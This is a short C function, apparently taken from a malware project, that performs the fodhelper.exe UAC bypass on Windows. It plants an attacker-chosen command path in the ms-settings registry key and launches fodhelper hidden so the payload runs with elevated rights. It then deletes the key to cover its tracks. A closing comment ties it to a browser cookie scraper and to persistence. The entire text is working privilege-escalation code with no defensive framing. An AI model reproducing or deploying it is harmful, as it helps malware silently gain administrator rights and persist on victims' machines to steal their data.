void UAC_bypass(const char *path) {
    HKEY k;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, 0, 0, KEY_WRITE, 0, &k, 0);
    RegSetValueExA(k, 0, 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
    RegSetValueExA(k, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(k);
	//instead of just opening fodhelper.exe
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", 0, 0, 0, FALSE, 0, 0, 0, &si, &pi);

	Sleep(500);
	RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");

}
// 0, = NULL 
// do not use for browser cookie scraper uacbypass is for persistence